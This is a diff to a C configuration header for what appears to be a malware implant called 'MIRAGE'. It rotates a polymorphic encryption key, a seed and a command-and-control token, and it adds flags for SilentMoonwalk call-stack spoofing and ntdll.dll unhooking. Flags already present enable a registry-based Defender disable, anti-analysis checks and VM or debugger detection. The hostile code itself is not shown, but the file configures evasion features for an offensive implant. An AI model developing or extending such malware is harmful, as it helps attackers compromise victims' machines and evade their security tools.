@@ -17,11 +17,11 @@ char *mi_strdup(const char *s);
 
 /* ═══════ Crypto Constants ═══════════════════════════════════════ */
 
-#define MIRAGE_SEED            0xF5B04BE4
+#define MIRAGE_SEED            0x54EE1EF6
 #define MIRAGE_SSN_XOR_KEY     0xA3B5C7D9
 
 static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
-    0x11, 0x6e, 0x42, 0x13, 0xc1, 0x86, 0x2d, 0x6a, 0xde, 0x64, 0xd1, 0xe2, 0xce, 0x61, 0x61, 0x8e   /* polymorphic */
+    0xaf, 0xa4, 0xb1, 0x68, 0x2e, 0x74, 0xab, 0xb7, 0x3d, 0x9c, 0xb7, 0x90, 0x24, 0x7c, 0x97, 0x56   /* polymorphic */
 };
 /* ═══════ Anti-Analysis Thresholds ═══════════════════════════════ */
 
@@ -131,7 +131,10 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 #define ENABLE_DEFENDER_DISABLE     /* Registry-based disable */
 #define ENABLE_ANTI_ANALYSIS        /* 15 weighted checks */
 #define ENABLE_DETECTION            /* VM/debugger/process detection */
+#define ENABLE_STACK_SPOOF          /* SilentMoonwalk call stack obfuscation */
+
 #define ENABLE_MUTEX                /* Single-instance event */
+#define ENABLE_UNHOOK_NTDLL         /* Restore ntdll.dll .text from clean copy */
 
 /* ═══════ Cleanup ═══════════════════════════════════════════════ */
 
@@ -166,7 +169,7 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 /* Build-time placeholder — overridden by make_polymorphic.py */
 #define C2_HOST                "127.0.0.1"
 #define C2_PORT                9999
-#define C2_TOKEN               "642ff9f0ca8dc61c0b5b7d6dccd61535"
+#define C2_TOKEN               "4fb2b055e3ce210592f718548248d7cf"
 
 /* ═══════ Certificate Pinning ═══════════════════════════════════ */
 /* L1: CERT_PIN_HASH is all-zero — pinning is a no-op until a real SPKI hash is set at build time.
